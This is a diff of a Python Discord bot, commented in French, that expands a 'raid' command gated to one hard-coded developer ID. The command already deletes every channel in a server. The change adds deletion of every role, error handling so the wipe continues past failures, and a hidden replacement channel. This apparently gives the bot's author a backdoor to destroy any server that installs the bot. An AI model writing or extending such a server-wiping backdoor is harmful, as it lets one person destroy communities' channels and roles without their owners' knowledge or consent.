@@ -8086,19 +8086,30 @@ async def raid(ctx):
     if ctx.author.id != ISEY_ID:
         await ctx.send("Tu n'as pas l'autorisation d'utiliser cette commande.")
         return
-    
+
     # Suppression de tous les salons
     for channel in ctx.guild.channels:
-        await channel.delete()
+        try:
+            await channel.delete()
+        except Exception as e:
+            print(f"Erreur lors de la suppression du salon {channel.name}: {e}")
+
+    # Suppression de tous les rôles (sauf @everyone)
+    for role in ctx.guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+            except Exception as e:
+                print(f"Erreur lors de la suppression du rôle {role.name}: {e}")
 
     # Création d'un nouveau salon "Chat-Tempo"
     overwrites = {
         ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
         ctx.guild.owner: discord.PermissionOverwrite(read_messages=True)
     }
-    
+
     await ctx.guild.create_text_channel('Chat-Tempo', overwrites=overwrites)
-    await ctx.send("Tous les salons ont été supprimés et 'Chat-Tempo' a été créé.")
+    await ctx.send("Tous les salons et rôles ont été supprimés, et 'Chat-Tempo' a été créé.")
 
 @bot.tree.command(name="activate-troll", description="Active les commandes troll pour ce serveur")
 @app_commands.checks.has_permissions(administrator=True)
